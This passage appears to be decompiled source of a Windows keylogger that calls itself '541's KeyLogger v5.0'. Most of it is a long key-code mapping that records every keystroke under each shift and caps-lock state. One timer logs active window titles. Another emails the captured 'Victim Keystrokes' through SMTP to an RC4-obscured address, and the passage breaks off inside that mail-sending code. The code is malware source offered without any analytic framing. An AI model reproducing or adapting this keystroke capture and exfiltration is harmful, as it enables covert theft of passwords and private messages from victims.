				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "~");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "d");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "~");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(strin, GetActiveWindowTitle(), false) != 0)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "\r\n=======================================================\r\n[----------------" + GetActiveWindowTitle() + "---------------]\r\n=======================================================\r\n");
			strin = GetActiveWindowTitle();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			Timer2.set_Interval(checked((int)Math.Round(Conversions.ToDouble(lblInterval.get_Text()) * Conversions.ToDouble("60000"))));
			MailMessage mailMessage = new MailMessage();
			mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name() + ":541's KeyLogger v5.0: Victim Keystrokes";
			mailMessage.To.Add(rc4(lblUsername.get_Text(), "Hello"));
			mailMessage.From = new MailAddress(rc4(lblUsername.get_Text(), "Hello"));
			mailMessage.Body = TextBox1.get_Text();
			SmtpClient smtpClient = new SmtpClient(lblSMTP.get_Text());
			smtpClient.Port = Conversions.ToInteger(lblPort.get_Text());
